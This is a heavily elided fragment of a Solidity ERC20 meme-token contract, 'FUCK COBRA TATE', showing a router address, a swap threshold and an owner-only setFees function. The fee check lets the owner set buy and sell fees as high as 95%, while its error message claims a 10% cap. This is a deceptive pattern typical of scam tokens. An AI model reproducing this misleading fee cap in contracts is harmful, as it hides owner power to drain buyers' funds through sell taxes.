...
contract FUCKCOBRATATE is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "FUCK COBRA TATE";
    string constant _symbol = "FCTATE";
    ...
    uint256 public swapThreshold = _totalSupply / 10000 * 15; // 0.15%
    bool inSwap;
...
function setFees(uint256 _MarketingFee, uint256 _liquidityFee, uint256 _sellLiquidityFee, uint256 _sellMarketingFee) external onlyOwner {
         ...
         require(totalFee <= 95 && totalSellFee <= 95, "Must keep fees at 10% or less");
    }
